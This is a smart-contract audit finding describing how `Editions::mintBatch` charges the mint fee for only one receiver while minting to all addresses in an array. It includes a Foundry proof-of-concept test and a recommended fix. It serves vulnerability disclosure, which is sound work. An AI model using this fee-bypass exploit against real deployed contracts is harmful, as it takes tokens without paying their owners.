# Mishandled ether in `Editions::mintBatch` allows tokens to be minted for free

## Summary
The `Editions::mintBatch` function that takes an array of addresses, or `receivers_`, allows users to mint many tokens for free. The issue arises because of improper fee handling based on the number of recipients.
 
## Vulnerability Detail
The `mintBatch` function is designed to mint a specified number of tokens `amount_` to multiple recipients `receivers_` listed in an array. However, the function fails to validate whether the user has sent the appropriate minting fee proportional to the number of recipients. This oversight allows a user to exploit the system by minting the `amount_` of tokens to each address in the `receivers_` array while only paying the minting fee for a single receiver.

For example, I call `mintBatch` with a `receivers_` array of 4 addresses and `amount_` = 1. The cost to mint all tokens should be mintFee * receivers_.length = 4. However I only need to send the mintFee to mint 1 token to 1 receiver to mint all 4 tokens to the 4 different receivers. To see this played out in code copy and paste the following test to Edition.t.sol and run with forge test --mt test_mintBatchReceiverArray -vvvv 
```solidity
function test_mintBatchReceiverArray() public {
        address hacker = makeAddr("hacker");
        vm.deal(hacker, 1 ether);

        uint256 addressCount = 1;

        address[] memory recievers = new address[](4);
        for(uint256 i = 0; i < 4; i++) {
            recievers[i] = vm.addr(++addressCount);
        }

        uint256 amount = 0.0106 ether; //should cost this much to mint 4 tokens

        vm.startPrank(hacker);
        edition.mintBatch{value: amount}(recievers, 1, 1, new bytes(0));

        console.log("total supply: ", edition.totalSupply(1));

        assertEq(edition.balanceOf(recievers[0], 1), 1);
        assertEq(edition.balanceOf(recievers[1], 1), 1);
        assertEq(edition.balanceOf(recievers[2], 1), 1);
        assertEq(edition.balanceOf(recievers[3], 1), 1);
        assertEq(address(1).balance, 0.01 ether);
        assertEq(address(0xc0ffee).balance, 0.0006 ether);

    }
```

## Recommendation
Validate that the user is sending the proper amount of ether to mint the total amount of tokens they wish to. Do this either in the `Editions::mintBatch` function or within the `FeeManager::_collectMintFee`
